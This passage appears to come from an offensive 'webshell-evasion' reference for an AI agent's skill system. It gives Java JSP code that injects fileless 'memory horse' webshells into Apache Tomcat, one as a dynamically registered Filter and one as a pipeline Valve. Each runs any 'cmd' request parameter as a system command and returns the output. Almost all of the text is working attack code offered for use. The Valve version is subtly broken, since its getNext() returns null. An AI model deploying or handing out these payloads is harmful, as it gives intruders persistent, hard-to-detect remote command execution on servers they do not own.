### 6.1 Java Filter Memory Horse

**Injection via JSP:**

```java
<%@ page import="java.io.*,java.lang.reflect.*,javax.servlet.*,javax.servlet.http.*,org.apache.catalina.core.*,org.apache.tomcat.util.descriptor.web.*" %>
<%
// Get the ServletContext
ServletContext ctx = request.getServletContext();
Field appCtxField = ctx.getClass().getDeclaredField("context");
appCtxField.setAccessible(true);
ApplicationContext appCtx = (ApplicationContext) appCtxField.get(ctx);

Field standardCtxField = appCtx.getClass().getDeclaredField("context");
standardCtxField.setAccessible(true);
StandardContext standardCtx = (StandardContext) standardCtxField.get(appCtx);

// Create filter
Filter filter = new Filter() {
    public void init(FilterConfig config) {}
    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain)
            throws IOException, ServletException {
        HttpServletRequest hreq = (HttpServletRequest) req;
        HttpServletResponse hresp = (HttpServletResponse) resp;
        String cmd = hreq.getParameter("cmd");
        if (cmd != null) {
            Process p = Runtime.getRuntime().exec(cmd);
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                hresp.getWriter().println(line);
            }
            return;
        }
        chain.doFilter(req, resp);
    }
    public void destroy() {}
};

// Register filter dynamically
FilterDef filterDef = new FilterDef();
filterDef.setFilterName("MemoryFilter");
filterDef.setFilterClass(filter.getClass().getName());
filterDef.setFilter(filter);
standardCtx.addFilterDef(filterDef);

FilterMap filterMap = new FilterMap();
filterMap.setFilterName("MemoryFilter");
filterMap.addURLPattern("/*");
standardCtx.addFilterMapBefore(filterMap);

// The filter is now active in memory
out.println("Memory filter injected successfully");
%>
```

**Tomcat Valve memory horse:**

```java
// Inject a Tomcat Valve into the pipeline
<%@ page import="org.apache.catalina.Valve,org.apache.catalina.connector.*,java.lang.reflect.*" %>
<%
// Get the StandardHost or StandardContext
Field pipelineField = request.getClass().getDeclaredField("request");
pipelineField.setAccessible(true);
Request req = (Request) pipelineField.get(request);
org.apache.catalina.Host host = req.getHost();

// Get the pipeline
Method getPipeline = host.getClass().getMethod("getPipeline");
org.apache.catalina.Pipeline pipeline = (org.apache.catalina.Pipeline) getPipeline.invoke(host);

// Add malicious valve
pipeline.addValve(new Valve() {
    public Valve getNext() { return null; }
    public void setNext(Valve v) {}
    public void backgroundProcess() {}
    public void invoke(Request rq, Response rp) throws IOException, ServletException {
        String cmd = rq.getParameter("cmd");
        if (cmd != null) {
            Process p = Runtime.getRuntime().exec(cmd);
            java.util.Scanner s = new java.util.Scanner(p.getInputStream()).useDelimiter("\\A");
            rp.getWriter().write(s.hasNext() ? s.next() : "");
            return;
        }
        getNext().invoke(rq, rp);
    }
    public boolean isAsyncSupported() { return false; }
});

out.println("Valve memory horse injected");
%>
```



---
📖 本切片 1/3 结束。 续篇: `skill_view(name="webshell-evasion", file_path="references/chapter-06-memory-horse-techniques-02.md")`
